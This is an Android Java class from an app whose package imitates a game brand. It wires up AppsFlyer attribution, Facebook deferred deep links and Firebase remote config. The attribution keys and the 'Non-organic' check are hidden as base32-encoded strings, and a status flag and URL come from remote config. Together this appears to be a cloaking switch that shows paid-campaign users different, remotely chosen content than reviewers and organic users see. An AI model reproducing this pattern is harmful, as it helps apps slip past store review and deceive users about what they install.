package com.rockstar.maxpayn.modAP;

import static com.rockstar.maxpayn.modAP.DataAP.decodeAP;

import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.rockstar.maxpayn.R;
import com.rockstar.maxpayn.actAp.ApAct;

import java.util.Map;

public class ConAP {

    public void appAp(DataAP dataAP, ApAct apAct) {
        Log.d("weq", "1");
        AppsFlyerLib.getInstance().init(apAct.getResources().getString(R.string.app), new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> map) {


                dataAP.setAf_statusAP(map.get(decodeAP("MFTF643UMF2HK4Y=")).toString());
                Log.d("weq", dataAP.getAf_statusAP());
                if (dataAP.getAf_statusAP().equals(decodeAP("JZXW4LLPOJTWC3TJMM======"))) {

                    try {
                        dataAP.setCampaignAP(map.get(decodeAP("MNQW24DBNFTW4===")).toString());
                    } catch (Exception e) {

                    }

                    try {
                        dataAP.setMedia_sourceAp(map.get(decodeAP("NVSWI2LBL5ZW65LSMNSQ====")).toString());
                    } catch (Exception e) {

                    }

                    try {

                        dataAP.setAf_channelAp(map.get(decodeAP("MFTF6Y3IMFXG4ZLM")).toString());
                    } catch (Exception e) {

                    }

                    dataAP.setStrAppsFlyerAP(dataAP.parseAP(dataAP.getCampaignAP(), apAct));
                    Log.d("weq", dataAP.getStrAppsFlyerAP() + "");
                } else {

                }

            }

            @Override
            public void onConversionDataFail(String s) {

            }

            @Override
            public void onAppOpenAttribution(Map<String, String> map) {

            }

            @Override
            public void onAttributionFailure(String s) {

            }
        }, apAct);
        AppsFlyerLib.getInstance().start(apAct);
    }

    public void conFireAp(DataAP dataAP,ApAct apAct){
        FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(3600)
                .build();
        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);

        new Thread(new Runnable() {
            @Override
            public void run() {
                mFirebaseRemoteConfig.fetchAndActivate()
                        .addOnCompleteListener(apAct, new OnCompleteListener<Boolean>() {
                            @Override
                            public void onComplete(@NonNull Task<Boolean> task) {
                                if (task.isSuccessful()) {
                                    boolean updated = task.getResult();
                                    Log.d("weq", "Config params updated: " + updated);
                                    dataAP.setStatusAP(mFirebaseRemoteConfig.getString("sap"));
                                    dataAP.setUrlAP(mFirebaseRemoteConfig.getString("urlap"));
                                    Log.d("weq",dataAP.getStatusAP());

                                } else {

                                }

                            }
                        });
            }
        }).start();

    }

    public void deepAP(DataAP dataAP, ApAct apAct) {
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();
        AppEventsLogger.activateApp(apAct.getApplication());

        AppLinkData.fetchDeferredAppLinkData(apAct.getApplicationContext(), new AppLinkData.CompletionHandler() {
            @Override
            public void onDeferredAppLinkDataFetched(@Nullable AppLinkData appLinkData) {
                if (appLinkData == null) {
                    appLinkData = AppLinkData.createFromActivity(apAct);

                }
                if (appLinkData != null) {

                    String[] fswq = appLinkData.getTargetUri().toString().split("://");
                   dataAP.setDeepAP(fswq[1]);
                   dataAP.setStrDeppAP(dataAP.parseAP(dataAP.getDeepAP(),apAct));
                   Log.d("weq",dataAP.getStrDeppAP());

                } else {

                }
            }
        });
    }
}
